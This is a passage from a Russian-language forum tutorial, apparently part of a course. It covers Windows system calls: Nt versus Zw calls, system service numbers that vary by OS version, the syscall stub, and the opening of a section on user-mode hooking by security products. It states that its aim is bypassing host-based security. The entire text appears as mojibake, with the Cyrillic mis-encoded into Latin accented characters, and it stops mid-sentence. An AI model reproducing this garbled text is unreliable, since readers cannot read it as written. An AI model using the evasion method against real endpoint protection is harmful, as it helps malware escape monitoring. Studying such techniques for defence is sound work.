–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–π –¥–æ—Å—Ç—É–ø –∫ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ, —á—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω–æ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã –∏–ª–∏ —Å–ª–æ–∂–Ω–µ–µ –≤—ã–ø–æ–ª–Ω—è—Ç—å —Å –ø–æ–º–æ—â—å—é —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö WinAPI. –ù–∞–ø—Ä–∏–º–µ—Ä, —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtCreateUserProcess –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –æ–ø—Ü–∏–∏ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ WinAPI CreateProcess –Ω–µ –º–æ–∂–µ—Ç.<br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –æ–±—Ö–æ–¥–∞ —Ö–æ—Å—Ç–æ–≤—ã—Ö —Ä–µ—à–µ–Ω–∏–π –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –æ —á–µ–º –±—É–¥–µ—Ç —Ä–∞—Å—Å–∫–∞–∑–∞–Ω–æ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ.<br />
<br />
<b>–°–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã Zw –ø—Ä–æ—Ç–∏–≤ Nt</b><br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –¥–≤–∞ —Ç–∏–ø–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤: —Ç–µ, —á—Ç–æ –Ω–∞—á–∏–Ω–∞—é—Ç—Å—è —Å Nt, –∏ –¥—Ä—É–≥–∏–µ —Å Zw.<br />
<br />
–°–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã NT - —ç—Ç–æ –æ—Å–Ω–æ–≤–Ω–æ–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º–º –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –≠—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –ø—Ä–æ–≥—Ä–∞–º–º Windows.<br />
<br />
–°–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã Zw, —Å –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç —Å–æ–±–æ–π –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞ –∫ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ. –û–Ω–∏ –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥—Ä–∞–π–≤–µ—Ä–∞–º–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏ –¥—Ä—É–≥–∏–º –∫–æ–¥–æ–º –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞, –∫–æ—Ç–æ—Ä–æ–º—É —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã.<br />
<br />
<b>–ü–æ–¥–≤–æ–¥—è –∏—Ç–æ–≥,</b> —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã Zw –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞ <b>–ø—Ä–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –¥—Ä–∞–π–≤–µ—Ä–æ–≤ —É—Å—Ç—Ä–æ–π—Å—Ç–≤</b>, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã Nt –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è <b>–∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.</b> –•–æ—Ç—è –≤–æ–∑–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–±–∞ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –≤—Å–µ —Ä–∞–≤–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –æ–¥–∏–Ω–∞–∫–æ–≤—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç. –≠—Ç–æ –º–æ–∂–Ω–æ –∑–∞–º–µ—Ç–∏—Ç—å –Ω–∞ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã—Ö –Ω–∏–∂–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è—Ö, –≥–¥–µ –æ–±–µ –≤–µ—Ä—Å–∏–∏ –æ–¥–Ω–æ–≥–æ –∏ —Ç–æ–≥–æ –∂–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–º–µ—é—Ç –æ–¥–∏–Ω –∏ —Ç–æ—Ç –∂–µ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785359165.png"
		data-src="https://osint42.org/attachments/1746785359165-png.198/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785359165-png.198/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785359165.png"
			title="1746785359165.png"
			width="659" height="122" loading="lazy" />
	</div><br />
<br />
–î–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã –≤ —ç—Ç–æ–º –∫—É—Ä—Å–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ç–æ–ª—å–∫–æ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã Nt.<br />
<br />
<b>–ù–æ–º–µ—Ä —Å–ª—É–∂–±—ã —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–£ –∫–∞–∂–¥–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –µ—Å—Ç—å —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä—ã–π –∏–∑–≤–µ—Å—Ç–µ–Ω –∫–∞–∫ –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–π —Å–ª—É–∂–±—ã –∏–ª–∏ SSN. –≠—Ç–∏ –Ω–æ–º–µ—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —è–¥—Ä–æ–º –¥–ª—è —Ä–∞–∑–ª–∏—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –º–µ–∂–¥—É —Å–æ–±–æ–π. –ù–∞–ø—Ä–∏–º–µ—Ä, —É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ NtAllocateVirtualMemory –±—É–¥–µ—Ç SSN —Ä–∞–≤–Ω—ã–π 24, —Ç–æ–≥–¥–∞ –∫–∞–∫ —É NtProtectVirtualMemory –±—É–¥–µ—Ç SSN —Ä–∞–≤–Ω—ã–π 80, —ç—Ç–∏ –Ω–æ–º–µ—Ä–∞ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —è–¥—Ä–æ–º –¥–ª—è —Ä–∞–∑–ª–∏—á–µ–Ω–∏—è NtAllocateVirtualMemory –æ—Ç NtProtectVirtualMemory.<br />
<br />
<b>–†–∞–∑–Ω—ã–µ SSN –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –û–°</b><br />
<br />
–í–∞–∂–Ω–æ –∑–Ω–∞—Ç—å, —á—Ç–æ SSN –±—É–¥—É—Ç —Ä–∞–∑–ª–∏—á–∞—Ç—å—Å—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –û–° (–Ω–∞–ø—Ä–∏–º–µ—Ä, Windows 10 –ø—Ä–æ—Ç–∏–≤ 11) –∏ –≤–Ω—É—Ç—Ä–∏ —Å–∞–º–æ–π –≤–µ—Ä—Å–∏–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, Windows 11 21h2 –ø—Ä–æ—Ç–∏–≤ Windows 11 22h2). –ò—Å–ø–æ–ª—å–∑—É—è –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç—ã–π –ø—Ä–∏–º–µ—Ä, NtAllocateVirtualMemory –º–æ–∂–µ—Ç –∏–º–µ—Ç—å SSN —Ä–∞–≤–Ω—ã–π 24 –≤ –æ–¥–Ω–æ–π –≤–µ—Ä—Å–∏–∏ Windows, —Ç–æ–≥–¥–∞ –∫–∞–∫ –≤ –¥—Ä—É–≥–æ–π –≤–µ—Ä—Å–∏–∏ –æ–Ω –±—É–¥–µ—Ç 34. –¢–æ –∂–µ —Å–∞–º–æ–µ –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ NtProtectVirtualMemory, –∞ —Ç–∞–∫–∂–µ –∫–æ –≤—Å–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–º —Å–∏—Å—Ç–µ–º–Ω—ã–º –≤—ã–∑–æ–≤–∞–º.<br />
<br />
<b>–°–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –≤ –ø–∞–º—è—Ç–∏ </b><br />
<br />
–í–Ω—É—Ç—Ä–∏ –º–∞—à–∏–Ω—ã SSN –Ω–µ —è–≤–ª—è—é—Ç—Å—è –∞–±—Å–æ–ª—é—Ç–Ω–æ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–º–∏ –∏ –∏–º–µ—é—Ç –æ—Ç–Ω–æ—à–µ–Ω–∏–µ –¥—Ä—É–≥ –∫ –¥—Ä—É–≥—É. –ö–∞–∂–¥—ã–π –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ –ø–∞–º—è—Ç–∏ —Ä–∞–≤–µ–Ω –ø—Ä–µ–¥—ã–¥—É—â–µ–º—É SSN + 1. –ù–∞–ø—Ä–∏–º–µ—Ä, SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ B —Ä–∞–≤–µ–Ω SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ A –ø–ª—é—Å –æ–¥–∏–Ω. –≠—Ç–æ —Ç–∞–∫–∂–µ –≤–µ—Ä–Ω–æ, –∫–æ–≥–¥–∞ –ø–æ–¥—Ö–æ–¥–∏—Ç–µ –∫ —Å–∏—Å—Ç–µ–º–Ω–æ–º—É –≤—ã–∑–æ–≤—É —Å –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –≥–¥–µ SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ C –±—É–¥–µ—Ç —Ç–µ–º –∏–∑ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ D –º–∏–Ω—É—Å –æ–¥–∏–Ω.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785367168.png"
		data-src="https://osint42.org/attachments/1746785367168-png.199/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785367168-png.199/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785367168.png"
			title="1746785367168.png"
			width="1134" height="782" loading="lazy" />
	</div><br />
<br />
–≠—Ç–æ –æ—Ç–Ω–æ—à–µ–Ω–∏–µ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏, –≥–¥–µ SSN ZwAxxessCheck —Ä–∞–≤–µ–Ω 0, –∞ SSN —Å–ª–µ–¥—É—é—â–µ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, NtWorkerFactoryWorkerReady, —Ä–∞–≤–µ–Ω 1 –∏ —Ç–∞–∫ –¥–∞–ª–µ–µ.<br />
<br />
–ü–æ–Ω–∏–º–∞–Ω–∏–µ —Ç–æ–≥–æ, —á—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –∏–º–µ—é—Ç –æ—Ç–Ω–æ—à–µ–Ω–∏–µ –¥—Ä—É–≥ –∫ –¥—Ä—É–≥—É, –ø—Ä–∏–≥–æ–¥–∏—Ç—Å—è –¥–ª—è –æ–±—Ö–æ–¥–∞ —Å–∏—Å—Ç–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–∞–ª–µ–µ.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, –æ–¥–∏–Ω–∞–∫–æ–≤–∞ –∏ –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>mov r10, rcx
mov eax, SSN
syscall</code></pre>
	</div>
</div><br />
–ù–∞–ø—Ä–∏–º–µ—Ä, NtAllocateVirtualMemory –Ω–∞ 64-–±–∏—Ç–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785378881.png"
		data-src="https://osint42.org/attachments/1746785378881-png.200/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785378881-png.200/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785378881.png"
			title="1746785378881.png"
			width="1419" height="114" loading="lazy" />
	</div><br />
<br />
–ò NtProtectVirtualMemory –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø—Ä–∏–º–µ—Ä–∞<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785384886.png"
		data-src="https://osint42.org/attachments/1746785384886-png.201/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785384886-png.201/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785384886.png"
			title="1746785384886.png"
			width="1404" height="114" loading="lazy" />
	</div><br />
<br />
<b>–û–±—ä—è—Å–Ω–µ–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–ü–µ—Ä–≤–∞—è —Å—Ç—Ä–æ–∫–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø–µ—Ä–µ–º–µ—â–∞–µ—Ç –ø–µ—Ä–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω–æ–µ –≤ RCX, –≤ —Ä–µ–≥–∏—Å—Ç—Ä R10. –ó–∞—Ç–µ–º SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø–µ—Ä–µ–º–µ—â–∞–µ—Ç—Å—è –≤ —Ä–µ–≥–∏—Å—Ç—Ä EAX. –ù–∞–∫–æ–Ω–µ—Ü, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
<b>–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ syscall –Ω–∞ 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö –∏–ª–∏ sysenter –Ω–∞ 32-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö </b>- —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –∏–Ω–∏—Ü–∏–∏—Ä—É—é—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤. –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ syscall –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Ç–æ–º—É, —á—Ç–æ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ø–µ—Ä–µ–¥–∞—Å—Ç —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∏–∑ —Ä–µ–∂–∏–º–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Ä–µ–∂–∏–º —è–¥—Ä–∞. –ó–∞—Ç–µ–º —è–¥—Ä–æ –≤—ã–ø–æ–ª–Ω–∏—Ç –∑–∞–ø—Ä–æ—à–µ–Ω–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –∏ –≤–µ—Ä–Ω–µ—Ç —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º–µ –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏.<br />
<br />
<b>–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ Test &amp; Jne</b><br />
<br />
–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ test –∏ jne –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω—ã –¥–ª—è —Ü–µ–ª–µ–π WoW64, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–∑–≤–æ–ª—è—é—Ç 32-–±–∏—Ç–Ω—ã–º –ø—Ä–æ—Ü–µ—Å—Å–∞–º —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–∞ 64-–±–∏—Ç–Ω–æ–π –º–∞—à–∏–Ω–µ. –≠—Ç–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –Ω–µ –≤–ª–∏—è—é—Ç –Ω–∞ –ø–æ—Ç–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –∫–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å —è–≤–ª—è–µ—Ç—Å—è 64-–±–∏—Ç–Ω—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.<br />
<br />
<b>–ù–µ –≤—Å–µ NtAPI —è–≤–ª—è—é—Ç—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏ </b><br />
<br />
–í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —Ö–æ—Ç—è –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ NtAPI –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç NTSTATUS, –æ–Ω–∏ –Ω–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ —è–≤–ª—è—é—Ç—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏. –≠—Ç–∏ NtAPI –º–æ–≥—É—Ç –±—ã—Ç—å –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏—è–º–∏ –±–æ–ª–µ–µ –Ω–∏–∑–∫–æ–≥–æ —É—Ä–æ–≤–Ω—è, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è WinAPI –∏–ª–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏. –ü—Ä–∏—á–∏–Ω–∞, –ø–æ –∫–æ—Ç–æ—Ä–æ–π –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ NtAPI –Ω–µ –∫–ª–∞—Å—Å–∏—Ñ–∏—Ü–∏—Ä—É—é—Ç—Å—è –∫–∞–∫ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã, –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –∏—Ö –Ω–µ—Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –Ω–∞–ø—Ä–∏–º–µ—Ä, –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏ –Ω–æ–º–µ—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏ –æ–±—ã—á–Ω–æ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ mov r10, rcx –≤ –Ω–∞—á–∞–ª–µ. –ü—Ä–∏–º–µ—Ä NtAPI, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ —è–≤–ª—è—é—Ç—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏, –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />
LdrLoadDll - –≠—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è LoadLibrary WinAPI –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –æ–±—Ä–∞–∑–∞ –≤ –≤—ã–∑—ã–≤–∞—é—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
SystemFunction032 –∏ SystemFunction033 - –≠—Ç–∏ NtAPI –±—ã–ª–∏ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ã —Ä–∞–Ω–µ–µ –∏ –≤—ã–ø–æ–ª–Ω—è—é—Ç –æ–ø–µ—Ä–∞—Ü–∏–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/–¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è RC4.<br />
<br />
RtlCreateProcessParametersEx - –≠—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è CreateProcess WinAPI –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ LdrLoadDll –ø–æ–∫–∞–∑–∞–Ω—ã –Ω–∏–∂–µ. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, –∫–∞–∫ –æ–Ω–æ –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ç–∏–ø–∏—á–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785404597.png"
		data-src="https://osint42.org/attachments/1746785404597-png.202/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785404597-png.202/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785404597.png"
			title="1746785404597.png"
			width="1523" height="441" loading="lazy" />
	</div><br />
<br />
<b>Syscalls - –ü–µ—Ä–µ—Ö–≤–∞—Ç –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ<br />
<br />
–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–†–µ—à–µ–Ω–∏—è –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Ö–æ—Å—Ç–∞ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç API –Ω–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–∞—Ö –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –ø—Ä–æ–≥—Ä–∞–º–º –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏. –ù–∞–ø—Ä–∏–º–µ—Ä, –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—è —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtProtectVirtualMemory, —Ä–µ—à–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –º–æ–∂–µ—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –±–æ–ª–µ–µ –≤—ã—Å–æ–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–µ –≤—ã–∑–æ–≤—ã WinAPI, —Ç–∞–∫–∏–µ –∫–∞–∫ VirtualProtect, <b>–¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω–∏ —Å–∫—Ä—ã—Ç—ã –æ—Ç —Ç–∞–±–ª–∏—Ü—ã –∞–¥—Ä–µ—Å–æ–≤ –∏–º–ø–æ—Ä—Ç–∞ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞.</b> –ö—Ä–æ–º–µ 